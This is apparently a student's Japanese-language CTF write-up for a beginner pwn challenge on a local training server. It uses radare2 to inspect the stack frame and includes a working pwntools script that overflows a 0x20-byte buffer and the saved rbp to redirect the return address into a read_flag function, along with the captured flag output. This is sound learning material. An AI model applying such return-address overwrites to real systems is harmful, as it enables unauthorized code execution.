# second 

## access

```
nc localhost 4102
```

## solve

```python
from pwn import *

io = remote("0.0.0.0", 4102)
```
まず問題を見てpdf @mainしたけどなんかめぼしいのが見つからないんだけど！？ってなって、ここでちょいとkitamu君のwriteupとsrc.cをちらちらしてきた。
したら、sym.read_flagってのがやっぱりあるらしい。。。
r2のコマンドを探すとaflってのを見つける。
aflをするとなんかいた↓
`0x004011d6    1 30           sym.read_flag`
こいつをpdf。"cat flag.txt"してそうだなと理解する。

pwnについて調べてるとローカルの下にあるリターンアドレスを書き換えるという問題があるらしい。
そこでこいつのスタックフレームを理解する。↓
`
           ; var char *s @ rbp-0x20
│           0x004011f4      f30f1efa       endbr64
│           0x004011f8      55             push rbp
│           0x004011f9      4889e5         mov rbp, rsp
│           0x004011fc      4883ec20       sub rsp, 0x20
`
どうやら、0x20確保してすべてのローカル領域を変数sが使ってるってのが分かった。
じゃあ前回みたいに0x20をAで埋めればよいのかと思いこの後に
`python -c print('a' * 0x20)と、 \xb6\x11\x40\x00`
をコピペして試してみる。うーん無理

もう一回スタックフレームについて調べてみる。
するとローカルの下にrbpってものがあることに気づく。
作ってくれた教科書をもう一度見直す。
lecture2の詳細のところに(saved rbp)という記述を見つける。よくみると8増えてる。そしてその下にはリターンアドレスの記述が！！

てことは…！
`python -c print('a' * (0x20 + 8)) と\xb6\x11\x40\x00 ` をコピペ
これで行けるかと思い試す。
無理無理無理無理全然無理

ちょいと調べてみるとどうやら\xb6などは入力ができないのでpythonを使うとよいとgoogle先生が教えてくれた。

そこで授業中に教えてくれたオリンピックに出てる方の記事とkitamu君のをちょちょちょと。

```python:damedame.py
from pwn import \*
  2
  3 hensu = ('a'\*(0x20+8) + "\xd6\x11\x40\x00")
  4
  5 io = remote('localhost',4102)
  6 io.sendline(hensu)
  7 io.interactive()
```
ここまで出来上がった。
やっぱり無理ポイ。ここまで見てみぬふりをしていた
>「必ずしも呼び出したい関数の最初に飛ばす必要は無い」
という記述に目を付け、文字列を変数に入れてるここ↓のアドレスを書いてみた。
`0x004011de      488d3d1f0e00.  lea rdi, str.cat_flag.txt   ; 
0x402004 ; "cat flag.txt" ; const char \*strin`
しかしまだうまくいかない。
またまたkitamu君のを見るとどうやらアドレスの終わりを
`\x00`
で四つ埋めていた。試しに四つに変えてみると成功した!
```python:seikai.py
 1 from pwn import *
  2
  3 hensu = ('a'*(0x20+8) + "\xde\x11\x40\x00\x00\x00\x00\x00")
  4
  5 io = remote('localhost',4102)
  6 io.sendline(hensu)
  7 io.interactive()
```

`[vagrant@fedora32 second]$ python seikai.py
[+] Opening connection to localhost on port 4102: Done
[*] Switching to interactive mode
buf <flag{Y0u_c4n_0v3rwr1t3_r3turn_4ddr}
[*] Got EOF while reading in interactive
`
ばっちり！！

## この問題で新しくわかったこと
* スタックフレームのローカルの下にはrbpがあってその下にリターンアドレス
* 呼びたいアドレスじゃなくても関数内のアドレスじゃないと呼べなかった。
    *理由はスタックフレームをバグらせて呼んでるのにさらにおかしくなってしまう？
* 64bitではリトルエンディアンの最後を\x00で埋める必要がある。

めっちゃ楽しかった！！
